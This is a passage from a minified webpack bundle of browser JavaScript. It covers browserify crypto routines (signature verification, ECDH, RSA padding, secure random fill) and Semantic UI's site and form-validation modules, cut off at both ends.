            f.push(0); for (var p = -1; ++p < n.length;) f.push(n[p]);
            f = new t(f); var b = s.mont(l.modulus);
            e = new s(e).toRed(b), e = e.redPow(new s(l.publicExponent)), e = new t(e.fromRed().toArray()); var m = h < 8 ? 1 : 0; for (d = Math.min(e.length, f.length), e.length !== f.length && (m = 1), p = -1; ++p < d;) m |= e[p] ^ f[p]; return 0 === m }

        function r(e, t, n) { var i = l[n.data.algorithm.curve.join(".")]; if (!i) throw new Error("unknown curve " + n.data.algorithm.curve.join(".")); var r = new c(i),
                o = n.data.subjectPrivateKey.data; return r.verify(t, e, o) }

        function o(e, t, n) { var i = n.data.p,
                r = n.data.q,
                o = n.data.g,
                c = n.data.pub_key,
                l = u.signature.decode(e, "der"),
                d = l.s,
                f = l.r;
            a(d, r), a(f, r); var h = s.mont(i),
                p = d.invm(r); return 0 === o.toRed(h).redPow(new s(t).mul(p).mod(r)).fromRed().mul(c.toRed(h).redPow(f.mul(p).mod(r)).fromRed()).mod(i).mod(r).cmp(f) }

        function a(e, t) { if (e.cmpn(0) <= 0) throw new Error("invalid sig"); if (e.cmp(t) >= t) throw new Error("invalid sig") } var s = n(3),
            c = n(4).ec,
            u = n(24),
            l = n(66);
        e.exports = i }).call(t, n(2).Buffer) }, function(e, t, n) {
    (function(t) {
        function i(e) { this.curveType = s[e], this.curveType || (this.curveType = { name: e }), this.curve = new o.ec(this.curveType.name), this.keys = void 0 }

        function r(e, n, i) { Array.isArray(e) || (e = e.toArray()); var r = new t(e); if (i && r.length < i) { var o = new t(i - r.length);
                o.fill(0), r = t.concat([o, r]) } return n ? r.toString(n) : r } var o = n(4),
            a = n(3);
        e.exports = function(e) { return new i(e) }; var s = { secp256k1: { name: "secp256k1", byteLength: 32 }, secp224r1: { name: "p224", byteLength: 28 }, prime256v1: { name: "p256", byteLength: 32 }, prime192v1: { name: "p192", byteLength: 24 }, ed25519: { name: "ed25519", byteLength: 32 }, secp384r1: { name: "p384", byteLength: 48 }, secp521r1: { name: "p521", byteLength: 66 } };
        s.p224 = s.secp224r1, s.p256 = s.secp256r1 = s.prime256v1, s.p192 = s.secp192r1 = s.prime192v1, s.p384 = s.secp384r1, s.p521 = s.secp521r1, i.prototype.generateKeys = function(e, t) { return this.keys = this.curve.genKeyPair(), this.getPublicKey(e, t) }, i.prototype.computeSecret = function(e, n, i) { return n = n || "utf8", t.isBuffer(e) || (e = new t(e, n)), r(this.curve.keyFromPublic(e).getPublic().mul(this.keys.getPrivate()).getX(), i, this.curveType.byteLength) }, i.prototype.getPublicKey = function(e, t) { var n = this.keys.getPublic("compressed" === t, !0); return "hybrid" === t && (n[n.length - 1] % 2 ? n[0] = 7 : n[0] = 6), r(n, e) }, i.prototype.getPrivateKey = function(e) { return r(this.keys.getPrivate(), e) }, i.prototype.setPublicKey = function(e, n) { return n = n || "utf8", t.isBuffer(e) || (e = new t(e, n)), this.keys._importPublic(e), this }, i.prototype.setPrivateKey = function(e, n) { n = n || "utf8", t.isBuffer(e) || (e = new t(e, n)); var i = new a(e); return i = i.toString(16), this.keys._importPrivate(i), this } }).call(t, n(2).Buffer) }, function(e, t, n) { t.publicEncrypt = n(159), t.privateDecrypt = n(160), t.privateEncrypt = function(e, n) { return t.publicEncrypt(e, n, !0) }, t.publicDecrypt = function(e, n) { return t.privateDecrypt(e, n, !0) } }, function(e, t, n) {
    (function(t) {
        function i(e, n) { var i = e.modulus.byteLength(),
                r = n.length,
                o = c("sha1").update(new t("")).digest(),
                a = o.length,
                f = 2 * a; if (r > i - f - 2) throw new Error("message too long"); var h = new t(i - r - f - 2);
            h.fill(0); var p = i - a - 1,
                b = s(a),
                m = l(t.concat([o, h, new t([1]), n], p), u(b, p)),
                g = l(b, u(m, a)); return new d(t.concat([new t([0]), g, m], i)) }

        function r(e, n, i) { var r = n.length,
                a = e.modulus.byteLength(); if (r > a - 11) throw new Error("message too long"); var s; return i ? (s = new t(a - r - 3), s.fill(255)) : s = o(a - r - 3), new d(t.concat([new t([0, i ? 1 : 2]), s, new t([0]), n], a)) }

        function o(e, n) { for (var i, r = new t(e), o = 0, a = s(2 * e), c = 0; o < e;) c === a.length && (a = s(2 * e), c = 0), (i = a[c++]) && (r[o++] = i); return r } var a = n(24),
            s = n(11),
            c = n(13),
            u = n(67),
            l = n(68),
            d = n(3),
            f = n(69),
            h = n(35);
        e.exports = function(e, t, n) { var o;
            o = e.padding ? e.padding : n ? 1 : 4; var s, c = a(e); if (4 === o) s = i(c, t);
            else if (1 === o) s = r(c, t, n);
            else { if (3 !== o) throw new Error("unknown padding"); if (s = new d(t), s.cmp(c.modulus) >= 0) throw new Error("data too long for modulus") } return n ? h(s, c) : f(s, c) } }).call(t, n(2).Buffer) }, function(e, t, n) {
    (function(t) {
        function i(e, n) { var i = (e.modulus, e.modulus.byteLength()),
                r = (n.length, d("sha1").update(new t("")).digest()),
                a = r.length; if (0 !== n[0]) throw new Error("decryption error"); var u = n.slice(1, a + 1),
                l = n.slice(a + 1),
                f = c(u, s(l, a)),
                h = c(l, s(f, i - a - 1)); if (o(r, h.slice(0, a))) throw new Error("decryption error"); for (var p = a; 0 === h[p];) p++; if (1 !== h[p++]) throw new Error("decryption error"); return h.slice(p) }

        function r(e, t, n) { for (var i = t.slice(0, 2), r = 2, o = 0; 0 !== t[r++];)
                if (r >= t.length) { o++; break }
            var a = t.slice(2, r - 1);
            t.slice(r - 1, r); if (("0002" !== i.toString("hex") && !n || "0001" !== i.toString("hex") && n) && o++, a.length < 8 && o++, o) throw new Error("decryption error"); return t.slice(r) }

        function o(e, n) { e = new t(e), n = new t(n); var i = 0,
                r = e.length;
            e.length !== n.length && (i++, r = Math.min(e.length, n.length)); for (var o = -1; ++o < r;) i += e[o] ^ n[o]; return i } var a = n(24),
            s = n(67),
            c = n(68),
            u = n(3),
            l = n(35),
            d = n(13),
            f = n(69);
        e.exports = function(e, n, o) { var s;
            s = e.padding ? e.padding : o ? 1 : 4; var c = a(e),
                d = c.modulus.byteLength(); if (n.length > d || new u(n).cmp(c.modulus) >= 0) throw new Error("decryption error"); var h;
            h = o ? f(new u(n), c) : l(n, c); var p = new t(d - h.length); if (p.fill(0), h = t.concat([p, h], d), 4 === s) return i(c, h); if (1 === s) return r(c, h, o); if (3 === s) return h; throw new Error("unknown padding") } }).call(t, n(2).Buffer) }, function(e, t, n) { "use strict";
    (function(e, i) {
        function r() { throw new Error("secure random number generation not supported by this browser\nuse chrome, FireFox or Internet Explorer 11") }

        function o(e, t) { if ("number" != typeof e || e !== e) throw new TypeError("offset must be a number"); if (e > b || e < 0) throw new TypeError("offset must be a uint32"); if (e > h || e > t) throw new RangeError("offset out of range") }

        function a(e, t, n) { if ("number" != typeof e || e !== e) throw new TypeError("size must be a number"); if (e > b || e < 0) throw new TypeError("size must be a uint32"); if (e + t > n || e > h) throw new RangeError("buffer too small") }

        function s(t, n, i, r) { if (!(f.isBuffer(t) || t instanceof e.Uint8Array)) throw new TypeError('"buf" argument must be a Buffer or Uint8Array'); if ("function" == typeof n) r = n, n = 0, i = t.length;
            else if ("function" == typeof i) r = i, i = t.length - n;
            else if ("function" != typeof r) throw new TypeError('"cb" argument must be a function'); return o(n, t.length), a(i, n, t.length), c(t, n, i, r) }

        function c(e, t, n, r) { if (i.browser) { var o = e.buffer,
                    a = new Uint8Array(o, t, n); return p.getRandomValues(a), r ? void i.nextTick(function() { r(null, e) }) : e } return r ? void d(n, function(n, i) { if (n) return r(n);
                i.copy(e, t), r(null, e) }) : (d(n).copy(e, t), e) }

        function u(t, n, i) { if (void 0 === n && (n = 0), !(f.isBuffer(t) || t instanceof e.Uint8Array)) throw new TypeError('"buf" argument must be a Buffer or Uint8Array'); return o(n, t.length), void 0 === i && (i = t.length - n), a(i, n, t.length), c(t, n, i) } var l = n(1),
            d = n(11),
            f = l.Buffer,
            h = l.kMaxLength,
            p = e.crypto || e.msCrypto,
            b = Math.pow(2, 32) - 1;
        p && p.getRandomValues || !i.browser ? (t.randomFill = s, t.randomFillSync = u) : (t.randomFill = r, t.randomFillSync = r) }).call(t, n(7), n(8)) }, function(e, t, n) {
    (function(e) {! function(e, t, n, i) { e.site = e.fn.site = function(i) { var r, o, a = (new Date).getTime(),
                    s = [],
                    c = arguments[0],
                    u = "string" == typeof c,
                    l = [].slice.call(arguments, 1),
                    d = e.isPlainObject(i) ? e.extend(!0, {}, e.site.settings, i) : e.extend({}, e.site.settings),
                    f = d.namespace,
                    h = d.error,
                    p = "module-" + f,
                    b = e(n),
                    m = b,
                    g = this,
                    v = m.data(p); return r = { initialize: function() { r.instantiate() }, instantiate: function() { r.verbose("Storing instance of site", r), v = r, m.data(p, r) }, normalize: function() { r.fix.console(), r.fix.requestAnimationFrame() }, fix: { console: function() { r.debug("Normalizing window.console"), void 0 !== console && void 0 !== console.log || (r.verbose("Console not available, normalizing events"), r.disable.console()), void 0 !== console.group && void 0 !== console.groupEnd && void 0 !== console.groupCollapsed || (r.verbose("Console group not available, normalizing events"), t.console.group = function() {}, t.console.groupEnd = function() {}, t.console.groupCollapsed = function() {}), void 0 === console.markTimeline && (r.verbose("Mark timeline not available, normalizing events"), t.console.markTimeline = function() {}) }, consoleClear: function() { r.debug("Disabling programmatic console clearing"), t.console.clear = function() {} }, requestAnimationFrame: function() { r.debug("Normalizing requestAnimationFrame"), void 0 === t.requestAnimationFrame && (r.debug("RequestAnimationFrame not available, normalizing event"), t.requestAnimationFrame = t.requestAnimationFrame || t.mozRequestAnimationFrame || t.webkitRequestAnimationFrame || t.msRequestAnimationFrame || function(e) { setTimeout(e, 0) }) } }, moduleExists: function(t) { return void 0 !== e.fn[t] && void 0 !== e.fn[t].settings }, enabled: { modules: function(t) { var n = []; return t = t || d.modules, e.each(t, function(e, t) { r.moduleExists(t) && n.push(t) }), n } }, disabled: { modules: function(t) { var n = []; return t = t || d.modules, e.each(t, function(e, t) { r.moduleExists(t) || n.push(t) }), n } }, change: { setting: function(t, n, i, o) { i = "string" == typeof i ? "all" === i ? d.modules : [i] : i || d.modules, o = void 0 === o || o, e.each(i, function(i, a) { var s, c = !r.moduleExists(a) || (e.fn[a].settings.namespace || !1);
                                r.moduleExists(a) && (r.verbose("Changing default setting", t, n, a), e.fn[a].settings[t] = n, o && c && (s = e(":data(module-" + c + ")"), s.length > 0 && (r.verbose("Modifying existing settings", s), s[a]("setting", t, n)))) }) }, settings: function(t, n, i) { n = "string" == typeof n ? [n] : n || d.modules, i = void 0 === i || i, e.each(n, function(n, o) { var a;
                                r.moduleExists(o) && (r.verbose("Changing default setting", t, o), e.extend(!0, e.fn[o].settings, t), i && f && (a = e(":data(module-" + f + ")"), a.length > 0 && (r.verbose("Modifying existing settings", a), a[o]("setting", t)))) }) } }, enable: { console: function() { r.console(!0) }, debug: function(e, t) { e = e || d.modules, r.debug("Enabling debug for modules", e), r.change.setting("debug", !0, e, t) }, verbose: function(e, t) { e = e || d.modules, r.debug("Enabling verbose debug for modules", e), r.change.setting("verbose", !0, e, t) } }, disable: { console: function() { r.console(!1) }, debug: function(e, t) { e = e || d.modules, r.debug("Disabling debug for modules", e), r.change.setting("debug", !1, e, t) }, verbose: function(e, t) { e = e || d.modules, r.debug("Disabling verbose debug for modules", e), r.change.setting("verbose", !1, e, t) } }, console: function(e) { if (e) { if (void 0 === v.cache.console) return void r.error(h.console);
                            r.debug("Restoring console function"), t.console = v.cache.console } else r.debug("Disabling console function"), v.cache.console = t.console, t.console = { clear: function() {}, error: function() {}, group: function() {}, groupCollapsed: function() {}, groupEnd: function() {}, info: function() {}, log: function() {}, markTimeline: function() {}, warn: function() {} } }, destroy: function() { r.verbose("Destroying previous site for", m), m.removeData(p) }, cache: {}, setting: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, d, t);
                        else { if (void 0 === n) return d[t];
                            d[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, r, t);
                        else { if (void 0 === n) return r[t];
                            r[t] = n } }, debug: function() { d.debug && (d.performance ? r.performance.log(arguments) : (r.debug = Function.prototype.bind.call(console.info, console, d.name + ":"), r.debug.apply(console, arguments))) }, verbose: function() { d.verbose && d.debug && (d.performance ? r.performance.log(arguments) : (r.verbose = Function.prototype.bind.call(console.info, console, d.name + ":"), r.verbose.apply(console, arguments))) }, error: function() { r.error = Function.prototype.bind.call(console.error, console, d.name + ":"), r.error.apply(console, arguments) }, performance: { log: function(e) { var t, n, i;
                            d.performance && (t = (new Date).getTime(), i = a || t, n = t - i, a = t, s.push({ Element: g, Name: e[0], Arguments: [].slice.call(e, 1) || "", "Execution Time": n })), clearTimeout(r.performance.timer), r.performance.timer = setTimeout(r.performance.display, 500) }, display: function() { var t = d.name + ":",
                                n = 0;
                            a = !1, clearTimeout(r.performance.timer), e.each(s, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, n, i) { var a, s, c, u = v; return n = n || l, i = g || i, "string" == typeof t && void 0 !== u && (t = t.split(/[\. ]/), a = t.length - 1, e.each(t, function(n, i) { var o = n != a ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(u[o]) && n != a) u = u[o];
                            else { if (void 0 !== u[o]) return s = u[o], !1; if (!e.isPlainObject(u[i]) || n == a) return void 0 !== u[i] ? (s = u[i], !1) : (r.error(h.method, t), !1);
                                u = u[i] } })), e.isFunction(s) ? c = s.apply(i, n) : void 0 !== s && (c = s), e.isArray(o) ? o.push(c) : void 0 !== o ? o = [o, c] : void 0 !== c && (o = c), s } }, u ? (void 0 === v && r.initialize(), r.invoke(c)) : (void 0 !== v && r.destroy(), r.initialize()), void 0 !== o ? o : this }, e.site.settings = { name: "Site", namespace: "site", error: { console: "Console cannot be restored, most likely it was overwritten outside of module", method: "The method you called is not defined." }, debug: !1, verbose: !1, performance: !0, modules: ["accordion", "api", "checkbox", "dimmer", "dropdown", "embed", "form", "modal", "nag", "popup", "rating", "shape", "sidebar", "state", "sticky", "tab", "transition", "visit", "visibility"], siteNamespace: "site", namespaceStub: { cache: {}, config: {}, sections: {}, section: {}, utilities: {} } }, e.extend(e.expr[":"], { data: e.expr.createPseudo ? e.expr.createPseudo(function(t) { return function(n) { return !!e.data(n, t) } }) : function(t, n, i) { return !!e.data(t, i[3]) } }) }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.form = function(t) { var i, r = e(this),
                    o = r.selector || "",
                    a = (new Date).getTime(),
                    s = [],
                    c = arguments[0],
                    u = arguments[1],
                    l = "string" == typeof c,
                    d = [].slice.call(arguments, 1); return r.each(function() { var f, h, p, b, m, g, v, y, w, x, S, _, k, C, A, E, T, M, R, P = e(this),
                        I = this,
                        D = [],
                        O = !1;
                    R = { initialize: function() { R.get.settings(), l ? (void 0 === M && R.instantiate(), R.invoke(c)) : (void 0 !== M && M.invoke("destroy"), R.verbose("Initializing form validation", P, y), R.bindEvents(), R.set.defaults(), R.instantiate()) }, instantiate: function() { R.verbose("Storing instance of module", R), M = R, P.data(E, R) }, destroy: function() { R.verbose("Destroying previous module", M), R.removeEvents(), P.removeData(E) }, refresh: function() { R.verbose("Refreshing selector cache"), f = P.find(S.field), h = P.find(S.group), p = P.find(S.message), b = P.find(S.prompt), m = P.find(S.submit), g = P.find(S.clear), v = P.find(S.reset) }, submit: function() { R.verbose("Submitting form", P), P.submit() }, attachEvents: function(t, n) { n = n || "submit", e(t).on("click" + T, function(e) { R[n](), e.preventDefault() }) }, bindEvents: function() { R.verbose("Attaching form events"), P.on("submit" + T, R.validate.form).on("blur" + T, S.field, R.event.field.blur).on("click" + T, S.submit, R.submit).on("click" + T, S.reset, R.reset).on("click" + T, S.clear, R.clear), y.keyboardShortcuts && P.on("keydown" + T, S.field, R.event.field.keydown), f.each(function() { var t = e(this),
                                    n = t.prop("type"),
                                    i = R.get.changeEvent(n, t);
                                e(this).on(i + T, R.event.field.change) }) }, clear: function() { f.each(function() { var t = e(this),
                                    n = t.parent(),
                                    i = t.closest(h),
                                    r = i.find(S.prompt),
                                    o = t.data(x.defaultValue) || "",
                                    a = n.is(S.uiCheckbox),
                                    s = n.is(S.uiDropdown);
                                i.hasClass(_.error) && (R.verbose("Resetting error on field", i), i.removeClass(_.error), r.remove()), s ? (R.verbose("Resetting dropdown value", n, o), n.dropdown("clear")) : a ? t.prop("checked", !1) : (R.verbose("Resetting field value", t, o), t.val("")) }) }, reset: function() { f.each(function() { var t = e(this),
                                    n = t.parent(),
                                    i = t.closest(h),
                                    r = i.find(S.prompt),
                                    o = t.data(x.defaultValue),
                                    a = n.is(S.uiCheckbox),
                                    s = n.is(S.uiDropdown),
                                    c = i.hasClass(_.error);
                                void 0 !== o && (c && (R.verbose("Resetting error on field", i), i.removeClass(_.error), r.remove()), s ? (R.verbose("Resetting dropdown value", n, o), n.dropdown("restore defaults")) : a ? (R.verbose("Resetting checkbox value", n, o), t.prop("checked", o)) : (R.verbose("Resetting field value", t, o), t.val(o))) }) }, determine: { isValid: function() { var t = !0; return e.each(w, function(e, n) { R.validate.field(n, e, !0) || (t = !1) }), t } }, is: { bracketedRule: function(e) { return e.type && e.type.match(y.regExp.bracket) }, shorthandFields: function(e) { var t = Object.keys(e),
                                    n = e[t[0]]; return R.is.shorthandRules(n) }, shorthandRules: function(t) { return "string" == typeof t || e.isArray(t) }, empty: function(e) { return !e || 0 === e.length || (e.is('input[type="checkbox"]') ? !e.is(":checked") : R.is.blank(e)) }, blank: function(t) { return "" === e.trim(t.val()) }, valid: function(t) { var n = !0; return t ? (R.verbose("Checking if field is valid", t), R.validate.field(w[t], t, !1)) : (R.verbose("Checking if form is valid"), e.each(w, function(e, t) { R.is.valid(e) || (n = !1) }), n) } }, removeEvents: function() { P.off(T), f.off(T), m.off(T), f.off(T) }, event: { field: { keydown: function(t) { var n = e(this),
                                        i = t.which,
                                        r = n.is(S.input),
                                        o = n.is(S.checkbox),
                                        a = n.closest(S.uiDropdown).length > 0,
                                        s = { enter: 13, escape: 27 };
                                    i == s.escape && (R.verbose("Escape key pressed blurring field"), n.blur()), t.ctrlKey || i != s.enter || !r || a || o || (O || (n.one("keyup" + T, R.event.field.keyup), R.submit(), R.debug("Enter pressed on input submitting form")), O = !0) }, keyup: function() { O = !1 }, blur: function(t) { var n = e(this),
                                        i = n.closest(h),
                                        r = R.get.validation(n);
                                    i.hasClass(_.error) ? (R.debug("Revalidating field", n, r), r && R.validate.field(r)) : "blur" != y.on && "change" != y.on || r && R.validate.field(r) }, change: function(t) { var n = e(this),
                                        i = n.closest(h),
                                        r = R.get.validation(n);
                                    r && ("change" == y.on || i.hasClass(_.error) && y.revalidate) && (clearTimeout(R.timer), R.timer = setTimeout(function() { R.debug("Revalidating field", n, R.get.validation(n)), R.validate.field(r) }, y.delay)) } } }, get: { ancillaryValue: function(e) { return !(!e.type || !e.value && !R.is.bracketedRule(e)) && (void 0 !== e.value ? e.value : e.type.match(y.regExp.bracket)[1] + "") }, ruleName: function(e) { return R.is.bracketedRule(e) ? e.type.replace(e.type.match(y.regExp.bracket)[0], "") : e.type }, changeEvent: function(e, t) { return "checkbox" == e || "radio" == e || "hidden" == e || t.is("select") ? "change" : R.get.inputEvent() }, inputEvent: function() { return void 0 !== n.createElement("input").oninput ? "input" : void 0 !== n.createElement("input").onpropertychange ? "propertychange" : "keyup" }, fieldsFromShorthand: function(t) { var n = {}; return e.each(t, function(t, i) { "string" == typeof i && (i = [i]), n[t] = { rules: [] }, e.each(i, function(e, i) { n[t].rules.push({ type: i }) }) }), n }, prompt: function(e, t) { var n, i, r, o = R.get.ruleName(e),
                                    a = R.get.ancillaryValue(e),
                                    s = e.prompt || y.prompt[o] || y.text.unspecifiedRule,
                                    c = -1 !== s.search("{value}"),
                                    u = -1 !== s.search("{name}"); return (u || c) && (i = R.get.field(t.identifier)), c && (s = s.replace("{value}", i.val())), u && (n = i.closest(S.group).find("label").eq(0), r = 1 == n.length ? n.text() : i.prop("placeholder") || y.text.unspecifiedField, s = s.replace("{name}", r)), s = s.replace("{identifier}", t.identifier), s = s.replace("{ruleValue}", a), e.prompt || R.verbose("Using default validation prompt for type", s, o), s }, settings: function() { if (e.isPlainObject(t)) { var n = Object.keys(t),
                                        i = n.length > 0 && (void 0 !== t[n[0]].identifier && void 0 !== t[n[0]].rules);
                                    i ? (y = e.extend(!0, {}, e.fn.form.settings, u), w = e.extend({}, e.fn.form.settings.defaults, t), R.error(y.error.oldSyntax, I), R.verbose("Extending settings from legacy parameters", w, y)) : (t.fields && R.is.shorthandFields(t.fields) && (t.fields = R.get.fieldsFromShorthand(t.fields)), y = e.extend(!0, {}, e.fn.form.settings, t), w = e.extend({}, e.fn.form.settings.defaults, y.fields), R.verbose("Extending settings", w, y)) } else y = e.fn.form.settings, w = e.fn.form.settings.defaults, R.verbose("Using default form validation", w, y);
                                A = y.namespace, x = y.metadata, S = y.selector, _ = y.className, k = y.regExp, C = y.error, E = "module-" + A, T = "." + A, M = P.data(E), R.refresh() }, field: function(t) { return R.verbose("Finding field with identifier", t), t = R.escape.string(t), f.filter("#" + t).length > 0 ? f.filter("#" + t) : f.filter('[name="' + t + '"]').length > 0 ? f.filter('[name="' + t + '"]') : f.filter('[name="' + t + '[]"]').length > 0 ? f.filter('[name="' + t + '[]"]') : f.filter("[data-" + x.validate + '="' + t + '"]').length > 0 ? f.filter("[data-" + x.validate + '="' + t + '"]') : e("<input/>") }, fields: function(t) { var n = e(); return e.each(t, function(e, t) { n = n.add(R.get.field(t)) }), n }, validation: function(t) { var n, i; return !!w && (e.each(w, function(e, r) { i = r.identifier || e, R.get.field(i)[0] == t[0] && (r.identifier = i, n = r) }), n || !1) }, value: function(e) { var t, n = []; return n.push(e), t = R.get.values.call(I, n), t[e] }, values: function(t) { var n = e.isArray(t) ? R.get.fields(t) : f,
                                    i = {}; return n.each(function(t, n) { var r = e(n),
                                        o = (r.prop("type"), r.prop("name")),
                                        a = r.val(),
                                        s = r.is(S.checkbox),
                                        c = r.is(S.radio),
                                        u = -1 !== o.indexOf("[]"),
                                        l = !!s && r.is(":checked");
                                    o && (u ? (o = o.replace("[]", ""), i[o] || (i[o] = []), s ? l ? i[o].push(a || !0) : i[o].push(!1) : i[o].push(a)) : c ? void 0 !== i[o] && 0 != i[o] || (i[o] = !!l && (a || !0)) : i[o] = s ? !!l && (a || !0) : a) }), i } }, has: { field: function(e) { return R.verbose("Checking for existence of a field with identifier", e), e = R.escape.string(e), "string" != typeof e && R.error(C.identifier, e), f.filter("#" + e).length > 0 || (f.filter('[name="' + e + '"]').length > 0 || f.filter("[data-" + x.validate + '="' + e + '"]').length > 0) } }, escape: { string: function(e) { return e = String(e), e.replace(k.escape, "\\$&") } }, add: { rule: function(e, t) { R.add.field(e, t) }, field: function(t, n) { var i = {};
                                R.is.shorthandRules(n) ? (n = e.isArray(n) ? n : [n], i[t] = { rules: [] }, e.each(n, function(e, n) { i[t].rules.push({ type: n }) })) : i[t] = n, w = e.extend({}, w, i), R.debug("Adding rules", i, w) }, fields: function(t) { var n;
                                n = t && R.is.shorthandFields(t) ? R.get.fieldsFromShorthand(t) : t, w = e.extend({}, w, n) }, prompt: function(t, n) { var i = R.get.field(t),
                                    r = i.closest(h),
                                    o = r.children(S.prompt),
                                    a = 0 !== o.length;
                                n = "string" == typeof n ? [n] : n, R.verbose("Adding field error state", t), r.addClass(_.error), y.inline && (a || (o = y.templates.prompt(n), o.appendTo(r)), o.html(n[0]), a ? R.verbose("Inline errors are disabled, no inline error added", t) : y.transition && void 0 !== e.fn.transition && P.transition("is supported") ? (R.verbose("Displaying error with css transition", y.transition), o.transition(y.transition + " in", y.duration)) : (R.verbose("Displaying error with fallback javascript animation"), o.fadeIn(y.duration))) }, errors: function(e) { R.debug("Adding form error messages", e), R.set.error(), p.html(y.templates.error(e)) } }, remove: { rule: function(t, n) { var i = e.isArray(n) ? n : [n]; if (void 0 == n) return R.debug("Removed all rules"), void(w[t].rules = []);
                                void 0 != w[t] && e.isArray(w[t].rules) && e.each(w[t].rules, function(e, n) {-1 !== i.indexOf(n.type) && (R.debug("Removed rule", n.type), w[t].rules.splice(e, 1)) }) }, field: function(t) { var n = e.isArray(t) ? t : [t];
                                e.each(n, function(e, t) { R.remove.rule(t) }) }, rules: function(t, n) { e.isArray(t) ? e.each(fields, function(e, t) { R.remove.rule(t, n) }) : R.remove.rule(t, n) }, fields: function(e) { R.remove.field(e) }, prompt: function(t) { var n = R.get.field(t),
                                    i = n.closest(h),
                                    r = i.children(S.prompt);
                                i.removeClass(_.error), y.inline && r.is(":visible") && (R.verbose("Removing prompt for field", t), y.transition && void 0 !== e.fn.transition && P.transition("is supported") ? r.transition(y.transition + " out", y.duration, function() { r.remove() }) : r.fadeOut(y.duration, function() { r.remove() })) } }, set: { success: function() { P.removeClass(_.error).addClass(_.success) }, defaults: function() { f.each(function() { var t = e(this),
                                        n = t.filter(S.checkbox).length > 0,
                                        i = n ? t.is(":checked") : t.val();
                                    t.data(x.defaultValue, i) }) }, error: function() { P.removeClass(_.success).addClass(_.error) }, value: function(e, t) { var n = {}; return n[e] = t, R.set.values.call(I, n) }, values: function(t) { e.isEmptyObject(t) || e.each(t, function(t, n) { var i, r = R.get.field(t),
                                        o = r.parent(),
                                        a = e.isArray(n),
                                        s = o.is(S.uiCheckbox),
                                        c = o.is(S.uiDropdown),
                                        u = r.is(S.radio) && s,
                                        l = r.length > 0;
                                    l && (a && s ? (R.verbose("Selecting multiple", n, r), o.checkbox("uncheck"), e.each(n, function(e, t) { i = r.filter('[value="' + t + '"]'), o = i.parent(), i.length > 0 && o.checkbox("check") })) : u ? (R.verbose("Selecting radio value", n, r), r.filter('[value="' + n + '"]').parent(S.uiCheckbox).checkbox("check")) : s ? (R.verbose("Setting checkbox value", n, o), !0 === n ? o.checkbox("check") : o.checkbox("uncheck")) : c ? (R.verbose("Setting dropdown value", n, o), o.dropdown("set selected", n)) : (R.verbose("Setting field value", n, r), r.val(n))) }) } }, validate: { form: function(e, t) { var n = R.get.values(); if (O) return !1; if (D = [], R.determine.isValid()) { if (R.debug("Form has no validation errors, submitting"), R.set.success(), !0 !== t) return y.onSuccess.call(I, e, n) } else if (R.debug("Form has errors"), R.set.error(), y.inline || R.add.errors(D), void 0 !== P.data("moduleApi") && e.stopImmediatePropagation(), !0 !== t) return y.onFailure.call(I, D, n) }, field: function(t, n, i) { i = void 0 === i || i, "string" == typeof t && (R.verbose("Validating field", t), n = t, t = w[t]); var r = t.identifier || n,
                                    o = R.get.field(r),
                                    a = !!t.depends && R.get.field(t.depends),
                                    s = !0,
                                    c = []; return t.identifier || (R.debug("Using field name as identifier", r), t.identifier = r), o.prop("disabled") ? (R.debug("Field is disabled. Skipping", r), s = !0) : t.optional && R.is.blank(o) ? (R.debug("Field is optional and blank. Skipping", r), s = !0) : t.depends && R.is.empty(a) ? (R.debug("Field depends on another value that is not present or empty. Skipping", a), s = !0) : void 0 !== t.rules && e.each(t.rules, function(e, n) { R.has.field(r) && !R.validate.rule(t, n) && (R.debug("Field is invalid", r, n.type), c.push(R.get.prompt(n, t)), s = !1) }), s ? (i && (R.remove.prompt(r, c), y.onValid.call(o)), !0) : (i && (D = D.concat(c), R.add.prompt(r, c), y.onInvalid.call(o, c)), !1) }, rule: function(t, n) { var i = R.get.field(t.identifier),
                                    r = (n.type, i.val()),
                                    o = R.get.ancillaryValue(n),
                                    a = R.get.ruleName(n),
                                    s = y.rules[a]; return e.isFunction(s) ? (r = void 0 === r || "" === r || null === r ? "" : e.trim(r + ""), s.call(i, r, o)) : void R.error(C.noRule, a) } }, setting: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, y, t);
                            else { if (void 0 === n) return y[t];
                                y[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, R, t);
                            else { if (void 0 === n) return R[t];
                                R[t] = n } }, debug: function() {!y.silent && y.debug && (y.performance ? R.performance.log(arguments) : (R.debug = Function.prototype.bind.call(console.info, console, y.name + ":"), R.debug.apply(console, arguments))) }, verbose: function() {!y.silent && y.verbose && y.debug && (y.performance ? R.performance.log(arguments) : (R.verbose = Function.prototype.bind.call(console.info, console, y.name + ":"), R.verbose.apply(console, arguments))) }, error: function() { y.silent || (R.error = Function.prototype.bind.call(console.error, console, y.name + ":"), R.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                y.performance && (t = (new Date).getTime(), i = a || t, n = t - i, a = t, s.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: I, "Execution Time": n })), clearTimeout(R.performance.timer), R.performance.timer = setTimeout(R.performance.display, 500) }, display: function() { var t = y.name + ":",
                                    n = 0;
                                a = !1, clearTimeout(R.performance.timer), e.each(s, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", o && (t += " '" + o + "'"), r.length > 1 && (t += " (" + r.length + ")"), (void 0 !== console.group || void 0 !== console.table) && s.length > 0 && (console.groupCollapsed(t), console.table ? console.table(s) : e.each(s, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), s = [] } }, invoke: function(t, n, r) { var o, a, s, c = M; return n = n || d, r = I || r, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
